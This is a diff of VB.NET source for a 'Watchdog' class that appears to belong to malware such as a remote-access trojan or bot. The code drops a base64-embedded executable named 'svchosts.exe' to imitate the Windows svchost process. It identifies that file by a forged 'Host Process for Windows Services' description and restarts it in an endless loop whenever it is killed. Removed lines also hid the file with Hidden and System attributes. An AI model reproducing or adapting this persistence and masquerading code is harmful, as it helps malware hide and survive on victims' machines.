@@ -3,61 +3,72 @@ Imports System.Windows.Forms
 Imports System.Threading
 
 Namespace Other
-    Public Module Watchdog
+    Public Class Watchdog
         Public watchert As Integer = 0
         Public watchthread As Thread
-        Public HardInstallStatus As Boolean = False
-
+        Public KeepRunning As Boolean = True
+        Dim Path As String = Application.StartupPath
+        Public Sub StartWatchdogService()
+            watchthread = New Thread(AddressOf CheckWatcher)
+            watchthread.IsBackground = True
+            watchthread.Start()
+        End Sub
         Public Sub NewWatchdog(ByVal WatcherByte As String)
             Try
-                Dim Path As String
-                If HardInstallStatus = True Then : Path = Environ("AppData") : Else : Path = Application.StartupPath : End If
-                If IO.File.Exists(Path & "\svchosts.exe") Then : IO.File.Delete(Path & "\svchosts.exe") : End If
-                IO.File.WriteAllBytes(Path & "\svchosts.exe", Convert.FromBase64String(WatcherByte))
-                IO.File.SetAttributes(Path & "\svchosts.exe", IO.FileAttributes.Hidden + IO.FileAttributes.System)
-                Process.Start(Path & "\svchosts.exe")
-                KeepWatcherRuning(True)
+                If Not IO.File.Exists(Path & "\svchosts.exe") Then
+                    IO.File.WriteAllBytes(Path & "\svchosts.exe", Convert.FromBase64String(WatcherByte))
+                End If
+
+                StartWatchdogService()
             Catch ex As Exception
 
             End Try
         End Sub
         Public Sub StopWatcher(ByVal DeleteWatcher As Boolean)
             Try
-                Dim Path As String
-                If HardInstallStatus = True Then : Path = Environ("AppData") : Else : Path = Application.StartupPath : End If
-                Dim Watcher() As Process = System.Diagnostics.Process.GetProcessesByName("svchosts")
+
+                Dim Watcher() As Process = System.Diagnostics.Process.GetProcessesByName(GetWatcher())
                 For Each KillWatcher As Process In Watcher
                     KillWatcher.Kill()
                 Next
-                KeepWatcherRuning(False)
+
+                CheckWatcher()
+
                 If DeleteWatcher = True Then
-                    IO.File.Delete(Path & "\svchosts.exe")
+                    IO.File.Delete(Path & "\" & GetWatcher() & ".exe")
                 End If
+
             Catch ex As Exception
 
             End Try
+
             watchthread.Abort()
         End Sub
-
-        Public Sub KeepWatcherRuning(ByVal Status As Boolean)
-            watchthread = New Thread(Sub() CheckWatcher(Status))
-            watchthread.IsBackground = True
-            watchthread.Start()
-        End Sub
-        Private Sub CheckWatcher(ByVal x As Boolean)
+        Private Sub CheckWatcher()
             Try
-                Dim Path As String
-                If HardInstallStatus = True Then : Path = Environ("AppData") : Else : Path = Application.StartupPath : End If
-                Do While x = True
-                    If Process.GetProcessesByName("svchosts").Length > 0 Then
+                Do While KeepRunning = True
+                    If (KeepRunning = True) Then
+                        If Process.GetProcessesByName(GetWatcher()).Length > 0 Then
 
+                        Else
+                            Process.Start(Path & "\" & GetWatcher() & ".exe")
+                        End If
                     Else
-                        Process.Start(Path & "\svchosts.exe")
+                        Exit Do
                     End If
                 Loop
             Catch ex As Exception
 
             End Try
         End Sub
-    End Module
+        Public Function GetWatcher() As String
+            Dim WatchFile() As String = IO.Directory.GetFiles(Application.StartupPath)
+            For Each file As String In WatchFile
+                Dim a As New IO.FileInfo(file)
+                If FileVersionInfo.GetVersionInfo(a.FullName).FileDescription = "Host Process for Windows Services" Then
+                    Return a.Name.Split(".")(0)
+                End If
+            Next
+        End Function
+    End Class
 End Namespace
